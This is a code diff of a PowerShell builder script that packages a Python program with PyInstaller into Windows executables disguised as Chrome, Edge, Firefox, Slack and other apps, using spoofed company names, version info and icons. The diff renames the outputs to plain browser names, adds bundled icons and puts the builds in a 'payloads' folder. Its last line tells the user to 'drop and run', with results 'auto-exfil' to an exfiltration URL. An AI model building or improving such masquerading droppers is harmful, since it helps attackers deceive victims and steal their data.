@@ -32,7 +32,7 @@ $ErrorActionPreference = "Stop"
 $presetDefs = @{
     # Browsers
     "chrome"    = @{
-        ExeName   = "chrome_crashpad_handler"
+        ExeName   = "chrome"
         Company   = "Google LLC"
         Desc      = "Google Chrome"
         IconPaths = @(
@@ -41,7 +41,7 @@ $presetDefs = @{
         )
     }
     "edge"      = @{
-        ExeName   = "msedge_crashpad_handler"
+        ExeName   = "edge"
         Company   = "Microsoft Corporation"
         Desc      = "Microsoft Edge"
         IconPaths = @(
@@ -50,7 +50,7 @@ $presetDefs = @{
         )
     }
     "brave"     = @{
-        ExeName   = "brave_crashpad_handler"
+        ExeName   = "brave"
         Company   = "Brave Software, Inc"
         Desc      = "Brave Browser"
         IconPaths = @(
@@ -58,7 +58,7 @@ $presetDefs = @{
         )
     }
     "firefox"   = @{
-        ExeName   = "plugin-container"
+        ExeName   = "firefox"
         Company   = "Mozilla Corporation"
         Desc      = "Mozilla Firefox"
         IconPaths = @(
@@ -67,7 +67,7 @@ $presetDefs = @{
         )
     }
     "opera"     = @{
-        ExeName   = "opera_crashpad_handler"
+        ExeName   = "opera"
         Company   = "Opera Software AS"
         Desc      = "Opera internet browser"
         IconPaths = @(
@@ -144,17 +144,25 @@ if ($Preset) {
     if (-not $Company)  { $Company  = $def.Company }
     if (-not $FileDesc) { $FileDesc = $def.Desc    }
     if (-not $IconFile) {
-        foreach ($pattern in $def.IconPaths) {
-            $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
-            if (-not $found) { continue }
-            if ($found.FullName -like "*\WindowsApps\*") { continue }
-            try {
-                $s = [System.IO.File]::OpenRead($found.FullName); $s.Close()
-                $IconFile = $found.FullName; break
-            } catch { continue }
-        }
-        if (-not $IconFile) {
-            Write-Host "[!] $($def.Desc) not found on this machine - building without icon"
+        # Check icons/ directory first (pre-extracted .ico files take priority)
+        $iconsDir = Join-Path $PSScriptRoot "icons"
+        $icoPath  = Join-Path $iconsDir "$key.ico"
+        if (Test-Path $icoPath) {
+            $IconFile = $icoPath
+            Write-Host "    Icon:         $icoPath (bundled)"
+        } else {
+            foreach ($pattern in $def.IconPaths) {
+                $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
+                if (-not $found) { continue }
+                if ($found.FullName -like "*\WindowsApps\*") { continue }
+                try {
+                    $s = [System.IO.File]::OpenRead($found.FullName); $s.Close()
+                    $IconFile = $found.FullName; break
+                } catch { continue }
+            }
+            if (-not $IconFile) {
+                Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico to fix"
+            }
         }
     }
 }
@@ -169,11 +177,11 @@ if (-not $ExeName -and -not $Preset) {
     Write-Host "Select a disguise preset:"
     Write-Host ""
     Write-Host "  BROWSERS"
-    Write-Host "  [1]  Chrome     - chrome_crashpad_handler  (Google LLC)"
-    Write-Host "  [2]  Edge       - msedge_crashpad_handler  (Microsoft Corporation)"
-    Write-Host "  [3]  Brave      - brave_crashpad_handler   (Brave Software, Inc)"
-    Write-Host "  [4]  Firefox    - plugin-container         (Mozilla Corporation)"
-    Write-Host "  [5]  Opera      - opera_crashpad_handler   (Opera Software AS)"
+    Write-Host "  [1]  Chrome     - chrome   (Google LLC)"
+    Write-Host "  [2]  Edge       - edge     (Microsoft Corporation)"
+    Write-Host "  [3]  Brave      - brave    (Brave Software, Inc)"
+    Write-Host "  [4]  Firefox    - firefox  (Mozilla Corporation)"
+    Write-Host "  [5]  Opera      - opera    (Opera Software AS)"
     Write-Host ""
     Write-Host "  CHAT APPS"
     Write-Host "  [6]  Slack      - slack                    (Slack Technologies, Inc.)"
@@ -194,17 +202,23 @@ if (-not $ExeName -and -not $Preset) {
         if (-not $Company)  { $Company  = $def.Company }
         if (-not $FileDesc) { $FileDesc = $def.Desc    }
         if (-not $IconFile) {
-            foreach ($pattern in $def.IconPaths) {
-                $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
-                if (-not $found) { continue }
-                if ($found.FullName -like "*\WindowsApps\*") { continue }
-                try {
-                    $s = [System.IO.File]::OpenRead($found.FullName); $s.Close()
-                    $IconFile = $found.FullName; break
-                } catch { continue }
-            }
-            if (-not $IconFile) {
-                Write-Host "[!] $($def.Desc) not found on this machine - building without icon"
+            $iconsDir = Join-Path $PSScriptRoot "icons"
+            $icoPath  = Join-Path $iconsDir "$key.ico"
+            if (Test-Path $icoPath) {
+                $IconFile = $icoPath
+            } else {
+                foreach ($pattern in $def.IconPaths) {
+                    $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
+                    if (-not $found) { continue }
+                    if ($found.FullName -like "*\WindowsApps\*") { continue }
+                    try {
+                        $s = [System.IO.File]::OpenRead($found.FullName); $s.Close()
+                        $IconFile = $found.FullName; break
+                    } catch { continue }
+                }
+                if (-not $IconFile) {
+                    Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico to fix"
+                }
             }
         }
     } else {
@@ -281,6 +295,9 @@ VSVersionInfo(
 "@ | Set-Content -Path $verFile -Encoding utf8
 
 # ── Build ─────────────────────────────────────────────────────────────────────
+$payloadsDir = Join-Path $PSScriptRoot "payloads"
+if (-not (Test-Path $payloadsDir)) { New-Item -ItemType Directory $payloadsDir | Out-Null }
+
 $buildTmp = Join-Path $env:TEMP "bb_build"
 $iconArgs = if ($IconFile -and (Test-Path $IconFile)) { @("--icon", $IconFile) } else { @() }
 
@@ -289,7 +306,7 @@ python -m PyInstaller `
     --name $ExeName `
     --version-file $verFile `
     @iconArgs `
-    --distpath $PSScriptRoot `
+    --distpath $payloadsDir `
     --workpath $buildTmp `
     --specpath $buildTmp `
     $tmpSrc
@@ -299,5 +316,5 @@ Remove-Item $verFile  -Force -ErrorAction SilentlyContinue
 Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
-Write-Host "[+] Done: $PSScriptRoot\$ExeName.exe"
+Write-Host "[+] Done: $payloadsDir\$ExeName.exe"
 Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
